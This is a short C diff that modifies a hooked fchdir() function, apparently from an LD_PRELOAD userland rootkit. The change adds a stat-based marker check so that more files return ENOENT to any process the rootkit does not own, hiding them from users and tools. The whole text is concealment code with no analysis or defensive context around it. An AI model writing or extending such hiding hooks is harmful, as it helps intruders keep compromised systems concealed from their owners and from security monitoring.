@@ -8,7 +8,7 @@ int fchdir(int fd)
 
     if(owned()) return old_fchdir(fd);
 
-    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }
+    if(hidden_fxattr(fd) || hidden_fxstat(_STAT_VER, fd, 32)) { errno = ENOENT; return -1; }
 
     return old_fchdir(fd);
 }
